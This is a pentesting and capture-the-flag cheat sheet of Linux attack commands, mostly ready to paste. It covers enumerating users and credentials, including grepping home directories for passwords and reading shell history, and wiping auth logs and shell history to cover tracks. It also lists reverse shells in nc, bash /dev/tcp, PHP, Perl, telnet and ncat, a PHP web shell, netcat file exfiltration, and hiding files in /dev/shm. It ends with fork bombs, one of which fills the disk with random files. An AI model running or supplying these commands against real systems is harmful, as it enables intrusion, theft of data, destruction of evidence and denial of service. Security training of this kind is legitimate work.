PENTESTING/CTF COMMANDS

ALWAYS RUNS:


Enumerate System:

id	get current username and group
w	see logged on users
who -a	get user info
uname -a	Kernel/CPU Version
	
cat /etc/passwd | cut -d ':' -f 1	show users on system
cat /etc/issue	Show OS Info
cat /etc/*release*	Show OS version info
cat /proc/version	Show Kernel info
	
ls /var/spool/cron	show cron files




Recent Activity:

last -a	Show last users logged on
history	Show last commands entered
cat ~/.*sh_history	show bash history

Caveman moves:

cd /home/; grep -Ri 'password' .	look for the string 'password' in the /home/ dir
cd /dev/;  grep -Ri 'password' .	look for the string 'password' in the /dev/ dir, consider adding  | grep -v Permission   to weed out off limits results



CLEAN UP
echo '' > /var/log/auth.log	clear auth log
echo '' > ~/.*sh_history	clear bash history file
shred -fuz ~/.*sh_history	destroy bash history file
history -c	clear history file for user


IMPROVE SHELL 
- GET TTY
python -c 'import pty;pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i   (best for Ubuntu Server)
perl â€”e 'exec "/bin/sh";'
perl: exec "/bin/sh";
:!bash	From inside vi editor
	


REVERSE SHELL COMMANDS

Listener - first run this on local machine
nc -lnvp PORTNUM

	
Reverse Shell - to be run on remote machine when listener is up on local machine
nc local.machine.ip.addr PORTNUM -e /bin/sh	Unix Machines
nc local.machine.ip.addr PORTNUM -e cmd.exe	Windows machines

NC shell without e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc local.machine.ip.addr PORTNUM > /tmp/f


NCAT (is slightly different than NC) allows SSL
ncat -lvp PORTNUM --ssl	run on LOCAL
ncat -e /bin/sh -v local.machine.ip.addr PORTNUM --ssl	run on REMOTE

Bash-Only Rev Shell:
bash -i >& /dev/tcp/local.machine.ip.addr/PORTNUM 0>&1

or

exec 5<>/dev/tcp/local.machine.ip.addr/PORTNUM
cat <&5 | while read line; do $line 2>&5 >&5; done

PHP System Rev Shell:
php -r '$sock=fsockopen("local.machine.ip.addr","PORTNUM");exec("/bin/sh -i <&3 >&3 2>&3");'

PHP URL Command Shell:
<?php passthru($_GET["cmd"]); ?>	works when url user '?page=', use '?page=PAGENAME&cmd=COMMANDS'

Telnet Reverse Shell:
rm -f /tmp/p; mknod /tmp/p p && telnet local.machine.ip.addr PORTNUM 0/tmp/p
or
telnet local.machine.ip.addr PORTNUM_A | /bin/bash | telnet local.machine.ip.addr PORTNUM_B   # Remember to listen on PORTNUM_B

PERL Rev Shell
perl -e 'use Socket;$i="local.machine.ip.addr";$p=PORTNUM;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


NC AND NETCAT

nc -lp PORTNUM -e /bin/sh	run on remote machine, then connect from local
	
File Transfer -> Local to Remote
nc -lp PORTNUM < FILENAME	run on local
nc -w3 local.machine.ip.addr PORTNUM > FILENAME	run on remote

File Transfer -> Remote to Local
nc -lp PORTNUM > FILENAME	run on local
nc -w3 local.machine.ip.addr PORTNUM < FILENAME	run on remote

	When transferring files, the /dev/shm folder is just stored in RAM, so it is a good place to keep things. Utilize .'s at the beginning of file names for added secrecry

NMAP COMMANDS

nmap -sn -T4 The.IP.Addr.0/24	pings The.IP.Addr.0-255, discovers hosts
nmap -sV The.host.IP.addr 	enumerates versions of ports on host


MISC COMMANDS

find / -perm -4000 2>/dev/null	see what current user has permissions to acess


-------------DO NOT USE THESE---------------------------

:(){ :|:& };:	Bash fork bomb
echo './bomb.txt' > bomb; chmod u+x bomb; ./bomb	fork bomb

EXPERIMENTAL
---Fork Bomb that leaves random files behind---- 
echo './fkfl >&1 & dd if=/dev/urandom of=$(cat /dev/urandom | tr -dc a-zA-Z0-9 | fold -w $(( (RANDOM % 100) +1 )) | head -n 1 ) bs=$(( (RANDOM % 9999999) + 1)) count=$(( (RANDOM % 100) +1 )) 2>/dev/null; ./fkfl'> fkfl; chmod u+x fkfl; ./fkfl


